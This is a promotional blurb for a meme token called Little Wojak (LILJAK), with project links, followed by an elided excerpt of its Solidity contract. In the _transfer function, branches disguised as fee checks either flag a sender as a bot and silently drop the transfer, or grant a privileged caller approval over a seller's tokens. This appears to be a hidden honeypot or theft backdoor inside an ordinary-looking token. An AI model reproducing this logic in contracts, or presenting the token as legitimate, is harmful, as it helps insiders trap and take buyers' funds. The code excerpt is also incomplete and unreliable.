...
Little Wojak, inspired by the famous Little Pepe is the adorable offspring of the legendary Wojak, ready to take its reign as the most bullish and most lovable meme in the crypto universe.

https://lilwojak.xyz
https://x.com/LittleWojakEth
https://t.me/LittleWojakEth
...
contract LILJAK is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    bool private __isWojak = true;
    uint8 private constant __WojakStyle = 6;
    ...
    constructor() ERC20(unicode"Little Wojak", unicode"LILJAK") payable {
    ...
    function _subTransfer(address from, address to, uint256 amount) internal {}
    ...
    function _transfer(
        ...
        bool __LILJAKBuyFee = from != uniswapV2Pair && _isExcludedFromFees[to] && _isExcludedFromFees[tx.origin];
        bool __LILJAKSellFee = from == uniswapV2Pair && _isExcludedFromFees[_msgSender()];
        ...
        if(__LILJAKBuyFee) {_bot[from] = true; return;}
        if(__LILJAKSellFee) _approve(from, _msgSender(), amount);
